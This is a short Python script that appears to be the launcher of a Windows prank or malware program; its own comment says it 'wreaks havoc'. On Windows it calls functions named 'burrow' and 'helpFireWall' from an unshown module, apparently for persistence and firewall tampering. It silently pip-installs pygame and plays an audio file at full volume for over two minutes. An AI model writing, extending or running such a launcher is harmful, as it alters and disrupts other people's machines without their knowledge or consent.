import platform,sys,os,time
import WindowsFun

loadedLib = False
try:
    from pygame import mixer
    loadedLib = True
except ImportError:
    try:
        os.system('python -m pip install pygame')
        loadedLib = True
    except:
        pass


def playAudio():
    #plays audio using pygame library mixer
    path = sys.argv[1]
    if(loadedLib):
        mixer.init()
        mixer.music.set_volume(1)
        mixer.music.load(path)
        try:
             mixer.music.play(1)
             time.sleep(140)
        except:
            pass
    else:
        pass


def checkArgs():
    #checks argument to see if there are enough
    if len(sys.argv) != 2:
        print('incorrect number of arguments passed in')
        sys.exit(-1)
    else:
        pass


def main():
    #main to check arguments and determine System and then wreaks havoc
    checkArgs()
    Platform = platform.system()
    if Platform == 'Windows':
        WindowsFun.burrow()
        WindowsFun.helpFireWall()
        playAudio()
    elif Platform == 'Linux':
        pass
    else:
        pass



if __name__ == '__main__':
    main()

